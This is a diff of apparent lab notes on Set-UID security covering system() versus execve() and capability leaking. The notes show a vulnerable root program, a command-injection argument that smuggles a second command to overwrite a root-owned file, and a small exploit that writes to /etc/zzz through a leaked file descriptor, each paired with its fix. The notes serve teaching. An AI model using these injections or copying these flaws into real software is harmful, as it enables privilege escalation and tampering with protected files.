@@ -191,7 +191,69 @@
             ```
 - conclusion: the environment variable `LD_PRELOAD` will be ignored by the dynamic linker/loader when the effective user id is different from the real user id
 
-## Task 8: 
+## Task 8: Invoking External Programs Using `system()` versus `execve()`
+- `system()` is not secure when used in a privileged program, while `execve()` doesn't have the problem, `execve()` requires the full path of executable
+- invoking shell has another dangerous consequence that has nothing to do with environment variables
 
-## Task 9: Capabilities
+- core code of the vulnerable `Set-UID` root program, `catall.c`
+    ```
+    v[0] = "/bin/cat";
+    v[1] = argv[1];
+    v[2] = NULL;
+    command = malloc(strlen(v[0]) + strlen(v[1]) + 2);
+    sprintf(command, "%s %s", v[0], v[1]);
 
+    // Use only one of the followings
+    system(command);
+    // execve(v[0], v, NULL);
+    ```
+- vulnerability:
+    - create a file `root_file`, owned by `root` and with privilege`-rwxr--r--`
+    - try argument `"a; echo I am Bob > root_file"`
+        ```
+        $ ./vul_cat "a; echo I am Bob > root_file"
+        /bin/cat: a: No such file or directory
+        $ cat root_file
+        I am Bob
+        ```
+    - use `execve(v[0], v, NULL)`, clear the content in `root_file`
+        ```
+        $ ./fixed_cat "a; echo I am Bob > root_file"
+        /bin/cat: 'a;echo I am Bob > root_file': No such file or directory
+        $ cat root_file
+        $
+        ```
+        - this attack doesn't work on `execve()`
+
+## Task 9: Capability Leaking
+- `Set-UID` programs often permanently relinquish their root privileges if such privileges are not needed anymore
+- Sometimes, the program needs to hand over its control to the user, so root privileges must be revoked
+- `setuid()` system call can be used to revoke the privileges, it sets effective user ID of the calling process, if a program with `euid=0(root)` calls `setuid(n)`, all its UIDs will be set to `n`
+- Capability leaking may be caused when revoking the privilege
+- vulnerable code `cap_leak.c`
+- vulnerability
+    - `cap_leak` checks the privilege and opens a file `/etc/zzz`, prints the file descriptor `fd`, the problem is that it doesn't close it, although it revokes root privilege, a normal user can still write to `/etc/zzz` with this `fd`
+    - prepare the code `write2fd.c`
+        ```
+        ...
+        int main(int argc, char *argv[]) {
+            int fd = atoi(argv[1]);
+            printf("writing to fd %d\n", fd);
+            const char *data = "written by a normal user\n";
+            write(fd, data, strlen(data));
+            return 0;
+        }
+        ```
+    - launch the attack
+        ```
+        $ ls -l /etc/zzz
+        -rwxr--r-- ...
+        $ gcc -o write2fd write2fd.c
+        $ ./cap_leak
+        fd is 3
+        $ ./write2fd 3
+        writing to fd 3
+        $ cat /etc/zzz
+        written by a normal user
+        ```
+    - the countermeasure is: close the file before revoking the privilege
